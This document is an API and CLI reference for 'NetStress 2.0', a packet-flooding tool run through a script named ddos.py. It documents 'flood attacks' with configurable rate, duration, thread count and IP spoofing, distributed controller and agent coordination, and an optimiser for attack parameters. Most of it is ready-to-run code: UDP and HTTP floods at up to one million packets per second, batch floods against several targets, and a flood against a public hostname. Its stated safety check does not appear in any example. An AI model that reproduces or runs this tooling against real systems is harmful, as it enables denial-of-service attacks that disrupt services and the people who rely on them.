# NetStress 2.0 Power Trio - API Reference

Complete API documentation for the NetStress 2.0 "Power Trio" architecture.

## Table of Contents

- [Power Trio Architecture Overview](#power-trio-architecture-overview)
- [Python Layer API](#python-layer-api)
- [Native Engine API](#native-engine-api)
- [Configuration API](#configuration-api)
- [Statistics API](#statistics-api)
- [CLI API](#cli-api)
- [Advanced Features API](#advanced-features-api)
- [Error Handling](#error-handling)
- [Examples](#examples)

## Power Trio Architecture Overview

NetStress 2.0 uses a three-layer "Sandwich" architecture:

```
┌─────────────────────────────────────────────────────────────┐
│                    PYTHON LAYER (Brain)                      │
│  User Interface │ Configuration │ AI/ML │ Analytics         │
├─────────────────────────────────────────────────────────────┤
│                    RUST LAYER (Engine)                       │
│  Packet Generation │ Memory Safety │ Threading │ SIMD       │
├─────────────────────────────────────────────────────────────┤
│                    C LAYER (Metal)                           │
│  DPDK │ AF_XDP │ io_uring │ sendmmsg │ Raw Sockets          │
└─────────────────────────────────────────────────────────────┘
```

## Python Layer API

### UltimateEngine Class

The main interface for high-performance packet generation.

```python
from core.native_engine import UltimateEngine, EngineConfig, Protocol

class UltimateEngine:
    """High-performance packet engine with automatic backend selection"""

    def __init__(self, config: EngineConfig)
    def start(self) -> None
    def stop(self) -> EngineStats
    def get_stats(self) -> EngineStats
    def is_running(self) -> bool
    def set_rate(self, pps: int) -> None

    # Context manager support
    def __enter__(self) -> 'UltimateEngine'
    def __exit__(self, exc_type, exc_val, exc_tb) -> bool

    # Properties
    @property
    def capabilities(self) -> SystemCapabilities

    @property
    def backend_name(self) -> str
```

#### Constructor

```python
def __init__(self, config: EngineConfig)
```

**Parameters:**

- `config` (EngineConfig): Engine configuration object

**Raises:**

- `RuntimeError`: If native backend is requested but not available

**Example:**

```python
config = EngineConfig(
    target="192.168.1.100",
    port=80,
    protocol=Protocol.UDP,
    threads=4,
    rate_limit=100000
)
engine = UltimateEngine(config)
```

#### Methods

##### start()

```python
def start(self) -> None
```

Start packet generation. Automatically selects the best available backend.

**Raises:**

- `RuntimeError`: If engine is already running

**Example:**

```python
engine.start()
print("Packet generation started")
```

##### stop()

```python
def stop(self) -> EngineStats
```

Stop packet generation and return final statistics.

**Returns:**

- `EngineStats`: Final performance statistics

**Raises:**

- `RuntimeError`: If engine is not running

**Example:**

```python
stats = engine.stop()
print(f"Sent {stats.packets_sent} packets at {stats.pps:.0f} PPS")
```

##### get_stats()

```python
def get_stats(self) -> EngineStats
```

Get current real-time statistics without stopping the engine.

**Returns:**

- `EngineStats`: Current performance statistics

**Example:**

```python
while engine.is_running():
    stats = engine.get_stats()
    print(f"Current rate: {stats.pps:.0f} PPS")
    time.sleep(1)
```

##### set_rate()

```python
def set_rate(self, pps: int) -> None
```

Dynamically adjust the target packet rate.

**Parameters:**

- `pps` (int): Target packets per second (0 = unlimited)

**Example:**

```python
engine.set_rate(50000)  # Reduce to 50K PPS
```

#### Context Manager Usage

```python
with UltimateEngine(config) as engine:
    time.sleep(10)
    stats = engine.get_stats()
    print(f"Rate: {stats.pps:.0f} PPS")
# Engine automatically stopped
```

### Factory Functions

#### create_engine()

```python
def create_engine(
    target: str,
    port: int,
    protocol: str = "udp",
    threads: int = 0,
    packet_size: int = 1472,
    rate_limit: int = 0,
    duration: int = 60,
) -> UltimateEngine
```

Factory function to create an engine with sensible defaults.

**Parameters:**

- `target` (str): Target IP address or hostname
- `port` (int): Target port number
- `protocol` (str): Protocol ("udp", "tcp", "http", "icmp")
- `threads` (int): Worker threads (0 = auto-detect CPU cores)
- `packet_size` (int): Packet payload size in bytes
- `rate_limit` (int): Maximum packets per second (0 = unlimited)
- `duration` (int): Test duration in seconds

**Returns:**

- `UltimateEngine`: Configured engine instance

**Example:**

```python
engine = create_engine(
    target="192.168.1.100",
    port=80,
    protocol="udp",
    rate_limit=100000
)
```

#### quick_flood()

```python
def quick_flood(
    target: str,
    port: int,
    duration: int = 10,
    protocol: str = "udp",
    rate_limit: int = 0,
) -> EngineStats
```

Convenience function for simple flood attacks.

**Parameters:**

- `target` (str): Target IP address or hostname
- `port` (int): Target port number
- `duration` (int): Attack duration in seconds
- `protocol` (str): Protocol to use
- `rate_limit` (int): Maximum PPS (0 = unlimited)

**Returns:**

- `EngineStats`: Final attack statistics

**Example:**

```python
stats = quick_flood("192.168.1.100", 80, duration=30, rate_limit=50000)
print(f"Attack complete: {stats.packets_sent} packets sent")
```

## Native Engine API

### Rust Engine Functions

When the native Rust engine is available, additional high-performance functions are exposed:

#### start_flood()

```python
def start_flood(
    target: str,
    port: int,
    duration: int = 60,
    rate: int = 100000,
    threads: int = 4,
    packet_size: int = 1472,
    protocol: str = "udp",
) -> Dict[str, Any]
```

Direct interface to the Rust flood engine.

**Returns:**

```python
{
    'packets_sent': int,
    'bytes_sent': int,
    'average_pps': float,
    'average_bps': float,
    'errors': int,
    'duration_secs': float,
}
```

#### build_packet()

```python
def build_packet(
    src_ip: str,
    dst_ip: str,
    src_port: int,
    dst_port: int,
    protocol: str = "udp",
    payload: Optional[bytes] = None,
) -> bytes
```

Build custom packets using the native engine.

**Returns:**

- `bytes`: Raw packet data

**Example:**

```python
packet = build_packet(
    src_ip="10.0.0.1",
    dst_ip="192.168.1.100",
    src_port=12345,
    dst_port=80,
    protocol="udp",
    payload=b"test payload"
)
```

### Capability Detection

#### get_capabilities()

```python
def get_capabilities() -> SystemCapabilities
```

Detect system capabilities for backend selection.

**Returns:**

- `SystemCapabilities`: System capability information

**Example:**

```python
caps = get_capabilities()
print(f"Platform: {caps.platform}")
print(f"Native available: {caps.native_available}")
print(f"DPDK: {caps.has_dpdk}")
print(f"AF_XDP: {caps.has_af_xdp}")
print(f"io_uring: {caps.has_io_uring}")
```

#### is_native_available()

```python
def is_native_available() -> bool
```

Check if the native Rust engine is available.

**Returns:**

- `bool`: True if native engine is loaded

## Configuration API

### EngineConfig Class

```python
@dataclass
class EngineConfig:
    target: str
    port: int
    protocol: Protocol = Protocol.UDP
    threads: int = 4
    packet_size: int = 1472
    rate_limit: Optional[int] = None
    backend: BackendType = BackendType.AUTO
    duration: int = 60
    spoof_ips: bool = False
    burst_size: int = 32
```

**Fields:**

- `target` (str): Target IP address or hostname
- `port` (int): Target port number
- `protocol` (Protocol): Network protocol to use
- `threads` (int): Number of worker threads
- `packet_size` (int): Packet payload size in bytes
- `rate_limit` (Optional[int]): Maximum packets per second (None = unlimited)
- `backend` (BackendType): Preferred backend type
- `duration` (int): Test duration in seconds
- `spoof_ips` (bool): Enable IP address spoofing
- `burst_size` (int): Packets per batch operation

**Methods:**

```python
def to_dict(self) -> Dict[str, Any]
```

Convert configuration to dictionary format.

### Protocol Enum

```python
class Protocol(Enum):
    UDP = "udp"
    TCP = "tcp"
    ICMP = "icmp"
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
```

### BackendType Enum

```python
class BackendType(Enum):
    AUTO = "auto"          # Automatic selection
    NATIVE = "native"      # Force native engine
    DPDK = "dpdk"         # DPDK kernel bypass
    AF_XDP = "af_xdp"     # AF_XDP zero-copy
    IO_URING = "io_uring" # io_uring async I/O
    SENDMMSG = "sendmmsg" # sendmmsg batch syscalls
    RAW_SOCKET = "raw_socket" # Raw sockets
    PYTHON = "python"     # Pure Python fallback
```

## Statistics API

### EngineStats Class

```python
@dataclass
class EngineStats:
    packets_sent: int = 0
    bytes_sent: int = 0
    errors: int = 0
    duration: float = 0.0
    pps: float = 0.0          # Packets per second
    bps: float = 0.0          # Bytes per second
    gbps: float = 0.0         # Gigabits per second
    backend: str = "unknown"
    is_native: bool = False
```

**Properties:**

```python
@property
def mbps(self) -> float
    """Get megabits per second"""

@property
def success_rate(self) -> float
    """Get success rate as percentage"""
```

**Class Methods:**

```python
@classmethod
def from_dict(cls, data: Dict[str, Any]) -> 'EngineStats'
```

### SystemCapabilities Class

```python
@dataclass
class SystemCapabilities:
    platform: str = ""
    arch: str = ""
    cpu_count: int = 1
    has_dpdk: bool = False
    has_af_xdp: bool = False
    has_io_uring: bool = False
    has_sendmmsg: bool = False
    has_raw_socket: bool = True
    kernel_version: tuple = (0, 0)
    is_root: bool = False
    native_available: bool = False
```

**Methods:**

```python
@classmethod
def detect(cls) -> 'SystemCapabilities'
    """Detect current system capabilities"""
```

## CLI API

### Command Line Interface

```bash
python ddos.py [OPTIONS]
```

#### Required Arguments

- `-i, --ip TARGET`: Target IP address or hostname
- `-p, --port PORT`: Target port number
- `-t, --type PROTOCOL`: Protocol (TCP, UDP, HTTP, HTTPS, DNS, ICMP)

#### Optional Arguments

- `-d, --duration SECONDS`: Attack duration (default: 60)
- `-x, --threads COUNT`: Worker threads (default: auto-detect)
- `-s, --size BYTES`: Packet size (default: 1472)
- `--rate PPS`: Rate limit in packets per second
- `--backend BACKEND`: Force specific backend
- `--status`: Show system capabilities and status

#### Examples

```bash
# High-performance UDP flood
python ddos.py -i 192.168.1.100 -p 80 -t UDP --rate 1000000 --backend native

# HTTP flood with 8 threads
python ddos.py -i example.com -p 80 -t HTTP -x 8 -d 60

# Check system capabilities
python ddos.py --status
```

### Interactive Mode

```bash
python ddos.py --interactive
```

Interactive commands:

- `attack start TARGET PORT PROTOCOL [OPTIONS]`
- `attack stop`
- `attack status`
- `config show`
- `config set OPTION VALUE`
- `monitor start`
- `help [COMMAND]`

## Advanced Features API

### Safety Controls

```python
from core.safety import SafetyManager, TargetValidator

# Target validation
validator = TargetValidator()
validator.add_authorized_target("192.168.1.0/24")
if validator.is_authorized("192.168.1.100"):
    print("Target authorized")

# Resource monitoring
monitor = ResourceMonitor()
limits = ResourceLimits(max_cpu_percent=80, max_memory_mb=1024)
monitor.set_limits(limits)
```

### AI Optimization

```python
from core.ai import GeneticOptimizer, ReinforcementLearner

# Genetic algorithm optimization
optimizer = GeneticOptimizer()
best_params = optimizer.optimize(
    target="192.168.1.100",
    port=80,
    generations=50
)

# Reinforcement learning
rl_agent = ReinforcementLearner()
rl_agent.train(target="192.168.1.100", episodes=100)
```

### Distributed Testing

```python
from core.distributed import DistributedController, DistributedAgent

# Controller
controller = DistributedController(bind_port=9999)
await controller.start()

# Agent
agent = DistributedAgent(controller_host="192.168.1.1")
await agent.connect()
```

### Analytics

```python
from core.analytics import MetricsCollector, PredictiveAnalytics

# Real-time metrics
collector = MetricsCollector()
collector.start_collection()

# Predictive analytics
predictor = PredictiveAnalytics()
prediction = predictor.predict_performance(
    target="192.168.1.100",
    protocol="udp",
    rate=100000
)
```

## Error Handling

### Exception Hierarchy

```python
class NetStressError(Exception):
    """Base exception for NetStress errors"""

class BackendError(NetStressError):
    """Backend initialization or operation failed"""

class ConfigError(NetStressError):
    """Invalid configuration"""

class TargetError(NetStressError):
    """Target-related errors"""

class RateLimitError(NetStressError):
    """Rate limiting errors"""
```

### Common Error Scenarios

#### Native Engine Not Available

```python
try:
    engine = UltimateEngine(config)
except RuntimeError as e:
    if "not available" in str(e):
        print("Native engine not built. Using Python fallback.")
        config.backend = BackendType.PYTHON
        engine = UltimateEngine(config)
```

#### Permission Denied

```python
try:
    engine.start()
except PermissionError:
    print("Raw sockets require root/admin privileges")
    print("Try: sudo python your_script.py")
```

#### Target Resolution Failed

```python
try:
    engine = create_engine("invalid-hostname.local", 80)
except RuntimeError as e:
    if "resolve" in str(e):
        print(f"Failed to resolve hostname: {e}")
```

## Examples

### Basic Usage

```python
from core.native_engine import UltimateEngine, EngineConfig, Protocol

# Simple UDP flood
config = EngineConfig(
    target="192.168.1.100",
    port=80,
    protocol=Protocol.UDP,
    rate_limit=50000
)

with UltimateEngine(config) as engine:
    time.sleep(30)
    stats = engine.get_stats()
    print(f"Rate: {stats.pps:.0f} PPS, Backend: {stats.backend}")
```

### Advanced Configuration

```python
from core.native_engine import *

# High-performance configuration
config = EngineConfig(
    target="192.168.1.100",
    port=80,
    protocol=Protocol.UDP,
    threads=0,  # Auto-detect CPU cores
    packet_size=1472,  # MTU-optimized
    rate_limit=1000000,  # 1M PPS
    backend=BackendType.AUTO,  # Best available
    burst_size=64,  # Larger batches
)

engine = UltimateEngine(config)
engine.start()

# Monitor performance
for i in range(60):
    stats = engine.get_stats()
    print(f"[{i:2d}s] {stats.pps:8.0f} PPS | "
          f"{stats.gbps:5.2f} Gbps | "
          f"{stats.backend}")
    time.sleep(1)

final_stats = engine.stop()
print(f"\nFinal: {final_stats.packets_sent:,} packets sent")
```

### Capability Detection

```python
from core.native_engine import get_capabilities

caps = get_capabilities()

print(f"Platform: {caps.platform} ({caps.arch})")
print(f"CPU cores: {caps.cpu_count}")
print(f"Root/Admin: {caps.is_root}")
print(f"Native engine: {caps.native_available}")

print("\nAvailable backends:")
if caps.has_dpdk:
    print("  ✓ DPDK (100M+ PPS)")
if caps.has_af_xdp:
    print("  ✓ AF_XDP (10M-50M PPS)")
if caps.has_io_uring:
    print("  ✓ io_uring (1M-10M PPS)")
if caps.has_sendmmsg:
    print("  ✓ sendmmsg (500K-2M PPS)")
if caps.has_raw_socket:
    print("  ✓ Raw sockets (50K-500K PPS)")

print("  ✓ Python fallback (10K-50K PPS)")
```

### Batch Operations

```python
from core.native_engine import quick_flood

targets = [
    ("192.168.1.100", 80),
    ("192.168.1.101", 80),
    ("192.168.1.102", 80),
]

results = []
for target, port in targets:
    print(f"Testing {target}:{port}...")
    stats = quick_flood(target, port, duration=10, rate_limit=10000)
    results.append((target, stats))
    print(f"  Result: {stats.pps:.0f} PPS")

# Summary
total_packets = sum(stats.packets_sent for _, stats in results)
print(f"\nTotal packets sent: {total_packets:,}")
```

### Error Handling

```python
from core.native_engine import *

def safe_flood(target: str, port: int) -> Optional[EngineStats]:
    """Safely execute flood with comprehensive error handling"""
    try:
        # Check capabilities first
        caps = get_capabilities()
        if not caps.native_available:
            print("Warning: Native engine not available, using Python fallback")

        # Create configuration
        config = EngineConfig(
            target=target,
            port=port,
            protocol=Protocol.UDP,
            rate_limit=10000  # Conservative rate
        )

        # Execute attack
        with UltimateEngine(config) as engine:
            time.sleep(10)
            return engine.get_stats()

    except RuntimeError as e:
        print(f"Runtime error: {e}")
        return None
    except PermissionError:
        print("Permission denied. Try running as root/admin.")
        return None
    except Exception as e:
        print(f"Unexpected error: {e}")
        return None

# Usage
stats = safe_flood("192.168.1.100", 80)
if stats:
    print(f"Success: {stats.pps:.0f} PPS")
else:
    print("Attack failed")
```

## Performance Optimization Tips

### Backend Selection

1. **DPDK**: Maximum performance (100M+ PPS) but requires setup
2. **AF_XDP**: High performance (10M-50M PPS) on Linux 4.18+
3. **io_uring**: Good performance (1M-10M PPS) on Linux 5.1+
4. **sendmmsg**: Moderate performance (500K-2M PPS) on Linux
5. **Raw Socket**: Basic performance (50K-500K PPS) on all platforms

### Configuration Tuning

```python
# High-performance configuration
config = EngineConfig(
    threads=0,  # Use all CPU cores
    packet_size=1472,  # MTU-optimized
    burst_size=64,  # Larger batches
    backend=BackendType.AUTO,  # Best available
)

# Memory-efficient configuration
config = EngineConfig(
    threads=2,  # Fewer threads
    packet_size=64,  # Smaller packets
    burst_size=16,  # Smaller batches
    rate_limit=10000,  # Conservative rate
)
```

### System Optimization

```bash
# Linux kernel optimizations
sudo sysctl -w net.core.rmem_max=268435456
sudo sysctl -w net.core.wmem_max=268435456
sudo sysctl -w net.ipv4.tcp_timestamps=0

# For DPDK
echo 1024 | sudo tee /sys/kernel/mm/hugepages/hugepages-2048kB/nr_hugepages
```

This completes the comprehensive API reference for NetStress 2.0 Power Trio architecture.
